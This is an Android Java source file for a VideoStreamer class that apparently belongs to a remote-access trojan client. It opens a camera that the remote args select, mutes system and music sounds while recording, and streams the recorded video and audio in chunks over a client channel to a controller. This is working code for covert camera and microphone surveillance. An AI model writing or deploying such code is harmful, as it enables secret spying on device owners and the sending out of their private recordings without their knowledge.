package my.app.Library;

import android.app.Activity;
import android.hardware.Camera;
import android.media.AudioManager;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.os.Environment;
import android.util.Log;
import android.view.Surface;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.TextureView;
import my.app.client.ClientListener;
import android.content.Context;
import my.app.client.LauncherActivity;
import my.app.client.R;

import java.io.*;

public class VideoStreamer {
    private Camera camera;
    private MediaRecorder mediaRecorder;
    private boolean streaming = false;
    private Thread stream;
    private Thread loadf;
    private ClientListener cl;
    private File tempstore;
    private FileInputStream fis =null;
    private int bytesRead = 0;
    private byte[] dataToSend;
    private int numCam = Camera.getNumberOfCameras();
    private int FrontCam = Camera.CameraInfo.CAMERA_FACING_FRONT;
    private int BackCam = Camera.CameraInfo.CAMERA_FACING_BACK;
    private int channel;
    private TextureView mPreview;
    private File SDCardpath;
    private BufferedInputStream buf = null;
    private boolean rec = false;

    public VideoStreamer(ClientListener c, byte[] args, int chan) {
        cl = c;
        channel = chan;
        if (numCam > 1) {
            if (args[0] == 0) {
                camera = Camera.open(BackCam);
            } else {
                camera = Camera.open(FrontCam);
            }
        } else {
            camera = Camera.open();
        }
        mPreview = cl.getPreview();
        stream = new Thread(
                new Runnable() {
                    public void run() {
                        record();
                    }
                });
        try {
            SDCardpath = Environment.getExternalStorageDirectory();
            tempstore = new File(cl.getCacheDir()+"/Tryingagain.mp4");//(SDCardpath.getAbsolutePath() +"/Tryingagain.mp4" ); // cl.getCacheDir()
            fis = new FileInputStream(tempstore);
            buf = new BufferedInputStream(fis);
        } catch (Exception e) {
            Log.e("VideoStream", "Problem in creating File or Stream");


        }

    }
    public void mute(){
        AudioManager audioManager = (AudioManager) cl.getApplicationContext().getSystemService(Context.AUDIO_SERVICE);
        audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, true);
        audioManager.setStreamMute(AudioManager.STREAM_MUSIC,true);
    }
    public void unmute(){
        AudioManager audioManager = (AudioManager) cl.getApplicationContext().getSystemService(Context.AUDIO_SERVICE);
        audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, false);
        audioManager.setStreamMute(AudioManager.STREAM_MUSIC,false);
    }
    public void record() {
        long available;
        byte[] buffer = new byte[4096];
        prepare();
        mediaRecorder.start();
        try {
            while (streaming) {
                available = buf.available();
                //Log.i("MediaRecoder","Bytes aviable: "+available);
                if (available >0) {
                    bytesRead = buf.read(buffer);
                    Log.i("MediaRecorder", "BytesRead: " + bytesRead);
                    if (bytesRead == -1) {
                        Log.i("Mediarecorder", "break weil keine daten");
                        break;
                    }
                    dataToSend = new byte[bytesRead];
                    System.arraycopy(buffer, 0, dataToSend, 0, bytesRead);
                    buffer = new byte[4096];
                    cl.handleData(channel, dataToSend);
                }

            }

        } catch (IOException e) {
            Log.e("Fis", "No Bytes read from inputStream");
        }
    }

    public void startStream() {
        streaming = true;
        mute();
        stream.start();
    }

    public void stopStream() {
        try{
            mediaRecorder.stop();
            unmute();
        }catch(RuntimeException stopException){

        }
        streaming = false;
        mediaRecorder.reset();
        mediaRecorder.release();
        //tempstore.delete();
        camera.release();
        mediaRecorder = null;
        camera = null;
    }

    public boolean prepare() {
        try {
            camera.setPreviewTexture(mPreview.getSurfaceTexture());
        }catch (IOException e){
         return  false;
        }

        mediaRecorder = new MediaRecorder();
        camera.unlock();
        mediaRecorder.setCamera(camera);
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.DEFAULT);
        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.DEFAULT);
        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        mediaRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.H264);
        mediaRecorder.setOutputFile(tempstore.getAbsolutePath());
        try {
            mediaRecorder.prepare();
        } catch (IOException | IllegalStateException e) {
            mediaRecorder.reset();
            mediaRecorder.release();
            camera.release();
            return false;
        }
        return true;
    }
    public void startRec(){
        rec=true;
        mute();
        prepare();
        mediaRecorder.start();
        cl.handleData(channel,tempstore.getAbsolutePath().getBytes());
    }

    public void stopRec(){
        mediaRecorder.reset();
        mediaRecorder.release();
        camera.release();
        mediaRecorder = null;
        camera = null;
        rec = false;
        unmute();
    }
    public boolean getRecord(){
        return rec;
    }
}